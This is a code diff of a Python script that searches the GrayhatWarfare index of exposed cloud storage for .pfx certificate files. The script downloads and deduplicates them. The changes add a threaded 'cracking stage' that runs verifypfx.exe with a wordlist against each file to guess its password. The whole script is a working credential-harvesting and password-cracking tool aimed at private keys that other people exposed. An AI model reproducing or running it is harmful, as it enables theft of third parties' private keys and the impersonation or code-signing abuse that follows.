@@ -2,6 +2,15 @@ import hashlib
 import os
 import requests
 import json
+import threading
+import subprocess
+
+
+def run_verifypfx_on_file(filepath, verifypfx_path, common_roots_file):
+    print(f"\n\nAttempting to crack {filepath}.\n")
+    subprocess.run([verifypfx_path, filepath, common_roots_file])
+    print(f"\nFile {filepath} processed.\n\n")
+
 
 def download_file(filename, url):
     """
@@ -53,7 +62,7 @@ class certApiSearch:
         self.api_key = api_key
         self.search_terms_dict = search_terms_dict
         self.search_defaults = {
-          "limit" : "150",
+          "limit" : "50",
           "full-path" : "0"
         }
         self.get_query = self.BASE_URL + "?"
@@ -86,46 +95,73 @@ class certApiSearch:
         print("Number of unique name certs = " + str(len(catalogue)))
         return catalogue
 
-directory = "dls/"
-# If download directory doesnt exist, create
-isExist = os.path.exists(directory)
-if not isExist:
-    os.makedirs(directory)
-    print("Directory " + directory + " created")
+def main():
+    ####
+    #### DOWNLOADING STAGE 
+    ####
+    directory = "dls/"
+    # If download directory doesnt exist, create
+    isExist = os.path.exists(directory)
+    if not isExist:
+        os.makedirs(directory)
+        print("Directory " + directory + " created")
 
-with open("api_key.txt", "r") as f:
-    api_key = f.readlines()[0]
+    with open("api_key.txt", "r") as f:
+        api_key = f.readlines()[0]
 
-search_terms_dict = {
-    "extensions" : "pfx",
-    "keywords" : ""
-}
+    search_terms_dict = {
+        "extensions" : "pfx",
+        "keywords" : ""
+    }
 
-test = certApiSearch()
-search = test.grayhatwarfare(api_key, search_terms_dict)
-print("Search record limit = " + str(search['query']['limit']))
-print("Results found = " + str(search['meta']['results']))
+    test = certApiSearch()
+    search = test.grayhatwarfare(api_key, search_terms_dict)
+    print("Search record limit = " + str(search['query']['limit']))
+    print("Results found = " + str(search['meta']['results']))
 
-catalogue = test.catalogue_search_for_download(search)
+    catalogue = test.catalogue_search_for_download(search)
 
-# Maintain a set to keep track of hashes
-hashes = set()
+    # Maintain a set to keep track of hashes
+    hashes = set()
 
-for filename, url in catalogue.items():
-    print("Should I download: " + url)
-    temp_filename = directory + filename
-    download_result = download_file(temp_filename, url)
-    
-    if download_result:
-        file_hash = hash_file(temp_filename)
+    for filename, url in catalogue.items():
+        print("Should I download: " + url)
+        temp_filename = directory + filename
+        download_result = download_file(temp_filename, url)
         
-        if file_hash in hashes:
-            # This is a duplicate file, so remove it
-            os.remove(temp_filename)
-            print(f"Removed duplicate file: {temp_filename}")
-        else:
-            hashes.add(file_hash)
-            # Rename the file to its hash
-            new_filename = directory + file_hash
-            os.rename(temp_filename, new_filename)
-            print(f"Renamed {temp_filename} to {new_filename}")
+        if download_result:
+            file_hash = hash_file(temp_filename)
+            
+            if file_hash in hashes:
+                # This is a duplicate file, so remove it
+                os.remove(temp_filename)
+                print(f"Removed duplicate file: {temp_filename}")
+            else:
+                hashes.add(file_hash)
+                # Rename the file to its hash
+                new_filename = directory + file_hash
+                os.rename(temp_filename, new_filename)
+                print(f"Renamed {temp_filename} to {new_filename}")
+    ### 
+    ### CRACKING STAGE 
+    ###
+    verifypfx_path = "./verifypfx.exe"
+    common_roots_file = "./common_roots.txt"
+
+    # Start 2 threads
+    threads = []
+    for hash_name in hashes:
+        thread = threading.Thread(target=run_verifypfx_on_file, args=(directory+hash_name, verifypfx_path, common_roots_file))
+        threads.append(thread)
+        thread.start()
+
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
+
+    print("All tasks completed.")
+
+
+### MAIN ### 
+if __name__ == '__main__':
+    main()
